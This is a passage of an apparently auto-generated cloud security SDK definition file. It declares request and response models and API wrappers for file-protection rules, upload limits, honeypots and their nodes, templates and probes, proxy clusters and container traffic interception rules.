 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateFileProtectRuleResponse
 */
async function createFileProtectRuleWithOptions(request: CreateFileProtectRuleRequest, runtime: Util.RuntimeOptions): CreateFileProtectRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alertLevel)) {
    query['AlertLevel'] = request.alertLevel;
  }
  if (!Util.isUnset(request.fileOps)) {
    query['FileOps'] = request.fileOps;
  }
  if (!Util.isUnset(request.filePaths)) {
    query['FilePaths'] = request.filePaths;
  }
  if (!Util.isUnset(request.platform)) {
    query['Platform'] = request.platform;
  }
  if (!Util.isUnset(request.procPaths)) {
    query['ProcPaths'] = request.procPaths;
  }
  if (!Util.isUnset(request.ruleAction)) {
    query['RuleAction'] = request.ruleAction;
  }
  if (!Util.isUnset(request.ruleName)) {
    query['RuleName'] = request.ruleName;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.switchId)) {
    query['SwitchId'] = request.switchId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateFileProtectRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a core file monitoring rule.
 *
 * @param request CreateFileProtectRuleRequest
 * @return CreateFileProtectRuleResponse
 */
async function createFileProtectRule(request: CreateFileProtectRuleRequest): CreateFileProtectRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return createFileProtectRuleWithOptions(request, runtime);
}

model CreateFileUploadLimitRequest {
  limit?: long(name='Limit', description='The QPS limit on the files uploaded from the client. Valid values: 100 to 10000.

This parameter is required.', example='100'),
}

model CreateFileUploadLimitResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='CE500770-42D3-442E-9DDD-156E0F9F3B45'),
}

model CreateFileUploadLimitResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateFileUploadLimitResponseBody(name='body'),
}

/**
 * @summary Specifies the queries per second (QPS) limit on the files uploaded from the client.
 *
 * @param request CreateFileUploadLimitRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateFileUploadLimitResponse
 */
async function createFileUploadLimitWithOptions(request: CreateFileUploadLimitRequest, runtime: Util.RuntimeOptions): CreateFileUploadLimitResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.limit)) {
    query['Limit'] = request.limit;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateFileUploadLimit',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Specifies the queries per second (QPS) limit on the files uploaded from the client.
 *
 * @param request CreateFileUploadLimitRequest
 * @return CreateFileUploadLimitResponse
 */
async function createFileUploadLimit(request: CreateFileUploadLimitRequest): CreateFileUploadLimitResponse {
  var runtime = new Util.RuntimeOptions{};
  return createFileUploadLimitWithOptions(request, runtime);
}

model CreateHoneypotRequest {
  honeypotImageId?: string(name='HoneypotImageId', description='The ID of the honeypot image.

> You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to query the IDs of images from the **HoneypotImageId** response parameter.

This parameter is required.', example='sha256:ebc4c102ac407d53733c2373e8888a733ddce86f163ccbe7492ae1cbf26****'),
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.

> You can call the [ListAvailableHoneypot](~~ListAvailableHoneypot~~) operation to query the names of images from the **HoneypotImageName** response parameter.

This parameter is required.', example='HoneyPotImageName'),
  honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.

This parameter is required.', example='ruoyi'),
  meta?: string(name='Meta', description='The custom configuration of the honeypot in the JSON format. The value contains the following fields:

*   **trojan_git**: Git-specific Defense. Valid values:

    *   **zip**: Git Source Code Package
    *   **web**: Git Directory Leak
    *   **close**: Disabled

*   **trojan_git_addr**: Git Trojan Address.

*   **trojan_git.zip**: Git Trojan.

*   **burp**: Burp-specific Defense. Valid values:

    *   **open**: Enable
    *   **close**: Disable

*   **portrait_option**: Source Tracing Configuration. Valid values:

    *   **false**: Disable
    *   **true**: Enable', example='{\\\\"trojan_git\\\\":\\\\"close\\\\",\\\\"burp\\\\":\\\\"close\\\\",\\\\"portrait_option\\\\":\\\\"false\\\\"}'),
  nodeId?: string(name='NodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.

This parameter is required.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
}

model CreateHoneypotResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    controlNodeName?: string(name='ControlNodeName', description='The name of the management node.', example='managerNodename'),
    honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.', example='9bf8cd373112263d4bc102fc5dba9d9f812ee05d4d35c487d330d52e937f****'),
    honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', description='The display name of the honeypot image.', example='HoneyDisplayName'),
    honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.', example='tcp_proxy'),
    honeypotName?: string(name='HoneypotName', description='The custom name of the honeypot.', example='ruoyi'),
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
    presetId?: string(name='PresetId', description='The ID of the custom configuration for the honeypot.', example='ddh3731641137fe4b72b245346a2721d4b6tdgg3731641137fe4b72b245346a2721***'),
    state?: [ string ](name='State', description='An array that consists of the status information about the honeypot.'),
  }(name='Data', description='The information about the honeypot.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='29874225-EAAC-5415-8501-32DD20FD29F6'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateHoneypotResponseBody(name='body'),
}

/**
 * @summary Creates a honeypot.
 *
 * @param request CreateHoneypotRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateHoneypotResponse
 */
async function createHoneypotWithOptions(request: CreateHoneypotRequest, runtime: Util.RuntimeOptions): CreateHoneypotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageId)) {
    query['HoneypotImageId'] = request.honeypotImageId;
  }
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.honeypotName)) {
    query['HoneypotName'] = request.honeypotName;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a honeypot.
 *
 * @param request CreateHoneypotRequest
 * @return CreateHoneypotResponse
 */
async function createHoneypot(request: CreateHoneypotRequest): CreateHoneypotResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotWithOptions(request, runtime);
}

model CreateHoneypotNodeRequest {
  allowHoneypotAccessInternet?: boolean(name='AllowHoneypotAccessInternet', description='Specifies whether to allow honeypots to access the Internet. Valid values:

*   **true**: allows honeypots to access the Internet.
*   **false**: does not allow honeypots to access the Internet.', example='true'),
  availableProbeNum?: int32(name='AvailableProbeNum', description='The number of available probes.', example='20'),
  nodeName?: string(name='NodeName', description='The name of the management node.

This parameter is required.', example='manageNode'),
  securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='The CIDR blocks that are allowed to access the management node.'),
}

model CreateHoneypotNodeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotNode?: {
    nodeId?: string(name='NodeId', description='The ID of the management node.', example='37a15ff1-3475-4897-aa6c-f7fd9122****'),
  }(name='HoneypotNode', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The error message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='028CF634-5268-5660-9575-48C9ED6BF880'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotNodeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateHoneypotNodeResponseBody(name='body'),
}

/**
 * @summary Creates a management node.
 *
 * @param request CreateHoneypotNodeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateHoneypotNodeResponse
 */
async function createHoneypotNodeWithOptions(request: CreateHoneypotNodeRequest, runtime: Util.RuntimeOptions): CreateHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.allowHoneypotAccessInternet)) {
    query['AllowHoneypotAccessInternet'] = request.allowHoneypotAccessInternet;
  }
  if (!Util.isUnset(request.availableProbeNum)) {
    query['AvailableProbeNum'] = request.availableProbeNum;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.securityGroupProbeIpList)) {
    query['SecurityGroupProbeIpList'] = request.securityGroupProbeIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a management node.
 *
 * @param request CreateHoneypotNodeRequest
 * @return CreateHoneypotNodeResponse
 */
async function createHoneypotNode(request: CreateHoneypotNodeRequest): CreateHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotNodeWithOptions(request, runtime);
}

model CreateHoneypotPresetRequest {
  honeypotImageName?: string(name='HoneypotImageName', description='The name of the honeypot image.

This parameter is required.', example='webmin'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  meta?: string(name='Meta', description='The custom configurations of the honeypot template. The value is a JSON string that contains the following fields:

*   **portrait_option**: Social Source Tracing
*   **burp**: Burp-specific Defense
*   **trojan_git**: Git-specific Defense

This parameter is required.', example='{"burp":"close","trojan_git":"close","portrait_option":"true"}'),
  nodeId?: string(name='NodeId', description='The ID of the management node to which you want to deploy honeypots.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.

This parameter is required.', example='9373fe59-74d5-4505-bb24-c85352fb****'),
  presetName?: string(name='PresetName', description='The custom name of the honeypot template.

This parameter is required.', example='WebMin-online'),
}

model CreateHoneypotPresetResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotPreset?: {
    honeypotPresetId?: string(name='HoneypotPresetId', description='The ID of the honeypot template.', example='d6ece172-34d9-4942-99a4-b309cb55xxxx'),
  }(name='HoneypotPreset', description='The creation result.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7C1C6E65-C8B9-54C9-9F92-2F5E51C4E16D'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotPresetResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateHoneypotPresetResponseBody(name='body'),
}

/**
 * @summary Creates a honeypot template.
 *
 * @param request CreateHoneypotPresetRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateHoneypotPresetResponse
 */
async function createHoneypotPresetWithOptions(request: CreateHoneypotPresetRequest, runtime: Util.RuntimeOptions): CreateHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.meta)) {
    query['Meta'] = request.meta;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a honeypot template.
 *
 * @param request CreateHoneypotPresetRequest
 * @return CreateHoneypotPresetResponse
 */
async function createHoneypotPreset(request: CreateHoneypotPresetRequest): CreateHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotPresetWithOptions(request, runtime);
}

model CreateHoneypotProbeRequest {
  arp?: boolean(name='Arp', description='Specifies whether to enable Address Resolution Protocol (ARP) spoofing. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  businessGroupId?: string(name='BusinessGroupId', description='The ID of the business group.', example='2022011817324588686'),
  controlNodeId?: string(name='ControlNodeId', description='The ID of the management node.

> You can call the [ListHoneypotNode](~~ListHoneypotNode~~) operation to query the IDs of management nodes.

This parameter is required.', example='a882e590-b87b-45a6-87b9-d0a3e5a0****'),
  displayName?: string(name='DisplayName', description='The name of the probe.

This parameter is required.', example='testHoneyPotProbe'),
  honeypotBindList?: [ 
    {
      bindPortList?: [ 
        {
          bindPort?: boolean(name='BindPort', description='Specifies whether to bind a port. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
          endPort?: int32(name='EndPort', description='The end of the port range.', example='90'),
          fixed?: boolean(name='Fixed', description='Specifies whether the port is a fixed port. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
          startPort?: int32(name='StartPort', description='The start of the port range.', example='80'),
          targetPort?: int32(name='TargetPort', description='The destination port.

> If **HoneypotId** is specified, this parameter is required.', example='80'),
        }
      ](name='BindPortList', description='The listener ports.'),
      honeypotId?: string(name='HoneypotId', description='The ID of the honeypot.

> You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.', example='1a5eda2d40f92ac87d6b63e1a5ad4b76fe0d4110c4a3e2fa85438a29ae55****'),
    }
  ](name='HoneypotBindList', description='The configuration of the probe.'),
  ping?: boolean(name='Ping', description='Specifies whether to enable ping scan. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
  probeType?: string(name='ProbeType', description='The type of the probe. Valid values:

*   **host_probe**: host probe
*   **vpc_black_hole_probe**: virtual private cloud (VPC) probe

This parameter is required.', example='host_probe'),
  probeVersion?: string(name='ProbeVersion', description='The version of the probe.', example='0.0.0'),
  proxyIp?: string(name='ProxyIp', description='The IP address of the proxy.', example='192.168.XX.XX'),
  uuid?: string(name='Uuid', description='The UUID of the instance.

> If **ProbeType** is set to **host_probe**, this parameter is required.', example='e4af3620-6895-4e2f-a641-a9d8fb53****'),
  vpcId?: string(name='VpcId', description='The ID of the VPC.

> If **ProbeType** is set to **vpc_black_hole_probe**, this parameter is required. You can call the [DescribeVpcHoneyPotList](~~DescribeVpcHoneyPotList~~) operation to query the IDs of VPCs.', example='vpc-zm0asrkpv1q8gnk7mn4dn'),
}

model CreateHoneypotProbeResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  honeypotProbe?: {
    probeId?: string(name='ProbeId', description='The ID of the probe.', example='b69e9aa8-2ea8-4c5a-836a-c1fbacff****'),
  }(name='HoneypotProbe', description='The information about the probe.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code returned.', example='200'),
  message?: string(name='Message', description='The message returned.', example='successful'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B7A839E8-70AE-591D-8D9E-C5419A2240DB'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**: The request was successful.
*   **false**: The request failed.', example='true'),
}

model CreateHoneypotProbeResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateHoneypotProbeResponseBody(name='body'),
}

/**
 * @summary Creates a probe.
 *
 * @param request CreateHoneypotProbeRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateHoneypotProbeResponse
 */
async function createHoneypotProbeWithOptions(request: CreateHoneypotProbeRequest, runtime: Util.RuntimeOptions): CreateHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.arp)) {
    query['Arp'] = request.arp;
  }
  if (!Util.isUnset(request.businessGroupId)) {
    query['BusinessGroupId'] = request.businessGroupId;
  }
  if (!Util.isUnset(request.controlNodeId)) {
    query['ControlNodeId'] = request.controlNodeId;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.honeypotBindList)) {
    query['HoneypotBindList'] = request.honeypotBindList;
  }
  if (!Util.isUnset(request.ping)) {
    query['Ping'] = request.ping;
  }
  if (!Util.isUnset(request.probeType)) {
    query['ProbeType'] = request.probeType;
  }
  if (!Util.isUnset(request.probeVersion)) {
    query['ProbeVersion'] = request.probeVersion;
  }
  if (!Util.isUnset(request.proxyIp)) {
    query['ProxyIp'] = request.proxyIp;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a probe.
 *
 * @param request CreateHoneypotProbeRequest
 * @return CreateHoneypotProbeResponse
 */
async function createHoneypotProbe(request: CreateHoneypotProbeRequest): CreateHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotProbeWithOptions(request, runtime);
}

model CreateHoneypotProbeBindRequest {
  bindPortList?: [ 
    {
      bindPort?: boolean(name='BindPort', description='Specifies whether to bind the port. Valid values:

*   **true**
*   **false**', example='false'),
      endPort?: int32(name='EndPort', description='The end port on which the probe monitors.', example='80'),
      fixed?: boolean(name='Fixed', description='Specifies whether the port is a fixed port. Valid values:

*   **true**
*   **false**', example='false'),
      proto?: string(name='Proto', description='The type of the protocol. Valid values:

*   **tcp**
*   **udp**', example='tcp'),
      startPort?: int32(name='StartPort', description='The start port on which the probe monitors.', example='80'),
      targetPort?: int32(name='TargetPort', description='The destination port.', example='8080'),
    }
  ](name='BindPortList', description='The ports that are bound to the probe.'),
  honeypotId?: string(name='HoneypotId', description='The honeypot ID.

>  You can call the [ListHoneypot](~~ListHoneypot~~) operation to query the IDs of honeypots.', example='dba7d44775be8e0e5888ee3b1a62554a93d2512247cabc38ddeac17a3b3f****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  probeId?: string(name='ProbeId', description='The probe ID.

>  You can call the [ListHoneypotProbe](~~ListHoneypotProbe~~) operation to query the IDs of probes.', example='36bad711-d1ac-4419-ac68-c1aa280f****'),
  serviceIpList?: [ string ](name='ServiceIpList', description='The IP addresses that are monitored.'),
}

model CreateHoneypotProbeBindResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='E10BAF1C-A6C5-51E2-866C-76D5922E****'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model CreateHoneypotProbeBindResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateHoneypotProbeBindResponseBody(name='body'),
}

/**
 * @summary Creates a monitoring or forwarding service for a probe.
 *
 * @param request CreateHoneypotProbeBindRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateHoneypotProbeBindResponse
 */
async function createHoneypotProbeBindWithOptions(request: CreateHoneypotProbeBindRequest, runtime: Util.RuntimeOptions): CreateHoneypotProbeBindResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bindPortList)) {
    query['BindPortList'] = request.bindPortList;
  }
  if (!Util.isUnset(request.honeypotId)) {
    query['HoneypotId'] = request.honeypotId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.probeId)) {
    query['ProbeId'] = request.probeId;
  }
  if (!Util.isUnset(request.serviceIpList)) {
    query['ServiceIpList'] = request.serviceIpList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHoneypotProbeBind',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a monitoring or forwarding service for a probe.
 *
 * @param request CreateHoneypotProbeBindRequest
 * @return CreateHoneypotProbeBindResponse
 */
async function createHoneypotProbeBind(request: CreateHoneypotProbeBindRequest): CreateHoneypotProbeBindResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHoneypotProbeBindWithOptions(request, runtime);
}

model CreateHybridProxyClusterRequest {
  clusterName?: string(name='ClusterName', description='The name of the cluster.

This parameter is required.', example='Chester-Test'),
  ip?: string(name='Ip', description='The endpoint of the cluster.
>  You can specify an IP address or a domain name', example='192.168.xx.xx'),
  remark?: string(name='Remark', description='The description of the cluster.', example='remark test'),
}

model CreateHybridProxyClusterResponseBody = {
  requestId?: string(name='RequestId', description='The request ID.', example='CDCB0BBB-CFB2-5D38-BB49-500E2A21xxxx'),
}

model CreateHybridProxyClusterResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateHybridProxyClusterResponseBody(name='body'),
}

/**
 * @summary Creates a hybrid-cloud proxy cluster.
 *
 * @param request CreateHybridProxyClusterRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return CreateHybridProxyClusterResponse
 */
async function createHybridProxyClusterWithOptions(request: CreateHybridProxyClusterRequest, runtime: Util.RuntimeOptions): CreateHybridProxyClusterResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.ip)) {
    query['Ip'] = request.ip;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'CreateHybridProxyCluster',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Creates a hybrid-cloud proxy cluster.
 *
 * @param request CreateHybridProxyClusterRequest
 * @return CreateHybridProxyClusterResponse
 */
async function createHybridProxyCluster(request: CreateHybridProxyClusterRequest): CreateHybridProxyClusterResponse {
  var runtime = new Util.RuntimeOptions{};
  return createHybridProxyClusterWithOptions(request, runtime);
}

model CreateInterceptionRuleRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.

This parameter is required.', example='c35xxxa416'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.

This parameter is required.', example='sas-test-cnnf'),
  dstTargetList?: map[string]any(name='DstTargetList', description='The information about the destination network object. The value of this parameter contains the following fields:

*   targetId: the ID of the destination network object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.
*   ports: the destination port ranges.', example='[
      {
            "targetId": 600036,
            "ports": [
                  "1/65535"
            ]
      }
]'),
  interceptType?: long(name='InterceptType', description='The action on traffic. Valid values:

*   **1**: blocks traffic.
*   **2**: allows traffic and generates alerts.
*   **3**: allows traffic and does not generate alerts.

This parameter is required.', example='1'),
  orderIndex?: long(name='OrderIndex', description='The priority of the defense rule. Valid values: 1 to 1000. A smaller value indicates a higher priority.

This parameter is required.', example='1'),
  ruleName?: string(name='RuleName', description='The name of the defense rule.

This parameter is required.', example='test-rule-1'),
  ruleSwitch?: int32(name='RuleSwitch', description='Specifies the status of the defense rule. Valid values:

*   **0**: disables the rule.
*   **1**: enables the rule.

This parameter is required.', example='0'),
  ruleType?: string(name='RuleType', description='The type of the defense rule. Valid values:

*   customize: custom rule', example='customize'),
  srcTarget?: map[string]any(name='SrcTarget', description='The source network object. The value of this parameter contains the following field:

*   targetId: the ID of the source network object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.', example='{"targetId":301940}'),
}

model CreateInterceptionRuleShrinkRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.

This parameter is required.', example='c35xxxa416'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.

This parameter is required.', example='sas-test-cnnf'),
  dstTargetListShrink?: string(name='DstTargetList', description='The information about the destination network object. The value of this parameter contains the following fields:

*   targetId: the ID of the destination network object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.
*   ports: the destination port ranges.', example='[
      {
            "targetId": 600036,
            "ports": [
                  "1/65535"
            ]
      }
]'),
  interceptType?: long(name='InterceptType', description='The action on traffic. Valid values:

*   **1**: blocks traffic.
*   **2**: allows traffic and generates alerts.
*   **3**: allows traffic and does not generate alerts.

This parameter is required.', example='1'),
  orderIndex?: long(name='OrderIndex', description='The priority of the defense rule. Valid values: 1 to 1000. A smaller value indicates a higher priority.

This parameter is required.', example='1'),
  ruleName?: string(name='RuleName', description='The name of the defense rule.

This parameter is required.', example='test-rule-1'),
  ruleSwitch?: int32(name='RuleSwitch', description='Specifies the status of the defense rule. Valid values:

*   **0**: disables the rule.
*   **1**: enables the rule.

This parameter is required.', example='0'),
  ruleType?: string(name='RuleType', description='The type of the defense rule. Valid values:

*   customize: custom rule', example='customize'),
  srcTargetShrink?: string(name='SrcTarget', description='The source network object. The value of this parameter contains the following field:

*   targetId: the ID of the source network object. You can call the [ListInterceptionTargetPage](~~ListInterceptionTargetPage~~) operation to query the ID.', example='{"targetId":301940}'),
}

model CreateInterceptionRuleResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A01810A0-xxx5E2676'),
}

model CreateInterceptionRuleResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: CreateInterceptionRuleResponseBody(name='body'),
}
